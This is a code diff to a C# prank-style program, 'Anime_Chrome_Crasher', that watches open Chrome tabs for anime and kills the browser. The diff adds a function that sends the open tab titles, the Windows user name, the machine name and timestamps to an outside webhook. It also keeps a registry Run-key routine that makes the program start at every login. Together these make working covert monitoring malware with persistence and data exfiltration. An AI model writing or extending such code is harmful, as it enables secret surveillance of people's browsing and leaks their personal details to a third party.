@@ -9,6 +9,7 @@ namespace Anime_Chrome_Crasher
 {
     public class FindWindows
     {
+        public static DateTime startTime = DateTime.Now;
 
         public static bool GetChrome()
         {
@@ -40,10 +41,10 @@ namespace Anime_Chrome_Crasher
                         {
                             string tabsOpen = "Tabs open at time of incident : ";
                             foreach (AutomationElement tab in elmTabStrip.FindAll(TreeScope.Children, condTabItem)) {
-                                tabsOpen += tab.Current.Name + " , ";
+                                tabsOpen += "| " + tab.Current.Name + " |";
                             }
+                            sendDetectionMessage(tabsOpen);
                             killWindow("chrome");
-                            WeebHook.SendMessage(tabsOpen);
                             return true;
                         }
                     }
@@ -56,7 +57,7 @@ namespace Anime_Chrome_Crasher
             return false;
         }
 
-        public static void Start()
+        public static void AddRegistry()
         {
             using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
             {
@@ -84,6 +85,18 @@ namespace Anime_Chrome_Crasher
 
                 }
             }
+        }
+
+        public static void sendDetectionMessage(string tabs)
+        {
+            TimeSpan timeElapsed = DateTime.Now - startTime;
+            string timeDiff = "After approximately" + timeElapsed.Hours + " hours " + timeElapsed.Minutes + " minutes and "
+                + timeElapsed.Seconds + " seconds from the program starting anime was detected.";
+            WeebHook.SendMessage(timeDiff);
+            WeebHook.SendMessage("WARNING WEEB DETECTED AT " + DateTime.Now.ToString());
+            WeebHook.SendMessage("The user " + Environment.UserName + " on the machine " + Environment.MachineName
+                + "has been detected looking at anime");
+            WeebHook.SendMessage(tabs);
         }
     }
 
